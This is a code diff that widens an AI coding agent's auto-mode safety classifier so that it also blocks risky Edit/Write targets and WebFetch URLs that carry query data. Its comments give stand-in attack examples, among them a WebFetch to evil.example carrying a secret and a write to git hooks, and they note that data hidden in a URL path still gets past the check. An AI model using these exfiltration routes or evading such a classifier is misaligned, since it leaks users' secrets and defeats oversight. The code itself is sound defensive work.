@@ -8,13 +8,36 @@ use SugarCraft\Crush\ToolCall;
 
 /**
  * SafetyClassifier reviews each tool call in Auto mode against a fixed
- * blocklist of dangerous-action categories (per the crush_code_plan.md
- * "Auto" paragraph: 13 categories). Returns the category name if blocked,
- * null if the action is safe to auto-execute.
+ * blocklist of dangerous-action categories (the crush_code_plan.md "Auto"
+ * paragraph's thirteen, grown since — {@see PATTERNS} plus the two path
+ * categories below). Returns the category name if blocked, null if the action
+ * is safe to auto-execute.
  *
- * Only `Bash` is classified. Whether Write/Edit/WebFetch/`mcp__*` calls
- * should be classified in auto mode too (audit F-P3 part b) is a pending
- * decision, not an oversight to patch here.
+ * THREE TOOLS ARE CLASSIFIED, each by the argument that carries its risk
+ * (audit F-P3(b); before it only `Bash` was, so under `auto`
+ * `Write .git/hooks/pre-commit`, `WebFetch https://evil.example/?k=SECRET` and
+ * `mcp__db__drop_table` were all Allow):
+ *
+ * - `Bash` by its command, against {@see PATTERNS};
+ * - `Edit`/`Write` by their target, through {@see WritePathScope}: a path
+ *   under `.git`, `.sugar-crush` or `.mcp.json` is
+ *   {@see CATEGORY_PROTECTED_PATH_WRITE}, and one that is not provably inside
+ *   the project root — absolute with no root to compare, escaping, or simply
+ *   absent — is {@see CATEGORY_OUTSIDE_ROOT_WRITE};
+ * - `WebFetch` by what its URL carries, through {@see FetchTarget}: a query
+ *   string or userinfo is data sent to a host the model chose, so it is
+ *   `external-endpoint`, the same category a `curl -d` is. An unparseable URL
+ *   is too — fail closed; the tool would refuse it anyway, so the cost is one
+ *   strike, never a lost fetch. HONEST LIMIT: data can ride in a URL's PATH
+ *   or its hostname labels as well (`https://evil.example/<base64>`), and no
+ *   classifier can tell an exfiltrating path from an ordinary one; a
+ *   path-only fetch stays Allow here. `dont-ask`/`default` withholding
+ *   `WebFetch` entirely (audit F-P6) is the boundary; this is a guard rail.
+ *
+ * `mcp__*` calls are NOT classified here, and that is not a gap: their
+ * capability is server-defined and unknowable, so
+ * {@see PermissionGate::evaluateAuto()} asks before every one instead of
+ * pretending a category applies.
  *
  * Every pattern runs case-insensitively (see {@see self::regex()}), so a row
  * whose meaning hangs on a flag's case — curl's `-d` vs `-D`, ssh's `-L` vs
@@ -291,13 +314,50 @@ final class SafetyClassifier
     ];
 
     /**
+     * An `Edit`/`Write` aimed at `.git`, `.sugar-crush` or `.mcp.json` — the
+     * repository's machinery and the session's own policy files.
+     */
+    public const CATEGORY_PROTECTED_PATH_WRITE = 'protected-path-write';
+
+    /**
+     * An `Edit`/`Write` whose target is not provably inside the project root.
+     */
+    public const CATEGORY_OUTSIDE_ROOT_WRITE = 'outside-root-write';
+
+    /**
      * Classify a tool call — returns the dangerous-action category name if blocked,
      * null if the action is safe to auto-execute.
+     *
+     * @param string|null $projectRoot the root the write tools resolve a
+     *        relative path against; see {@see WritePathScope::of()} for what
+     *        changes without one (only a relative, lexically contained target
+     *        is inside). Only `Edit`/`Write` read it.
      */
-    public function classify(ToolCall $call): ?string
+    public function classify(ToolCall $call, ?string $projectRoot = null): ?string
     {
-        if ($call->name === 'Bash') {
-            return $this->classifyBash($call);
+        return match ($call->name) {
+            'Bash' => $this->classifyBash($call),
+            'Edit', 'Write' => $this->classifyWrite($call, $projectRoot),
+            'WebFetch' => $this->classifyFetch($call),
+            default => null,
+        };
+    }
+
+    private function classifyWrite(ToolCall $call, ?string $projectRoot): ?string
+    {
+        return match (WritePathScope::of($call->arguments['file_path'] ?? null, $projectRoot)) {
+            WritePathScope::INSIDE => null,
+            WritePathScope::PROTECTED => self::CATEGORY_PROTECTED_PATH_WRITE,
+            default => self::CATEGORY_OUTSIDE_ROOT_WRITE,
+        };
+    }
+
+    private function classifyFetch(ToolCall $call): ?string
+    {
+        $target = FetchTarget::fromUrl($call->arguments['url'] ?? null);
+
+        if ($target === null || $target->carriesQuery || $target->carriesUserInfo) {
+            return 'external-endpoint';
         }
 
         return null;
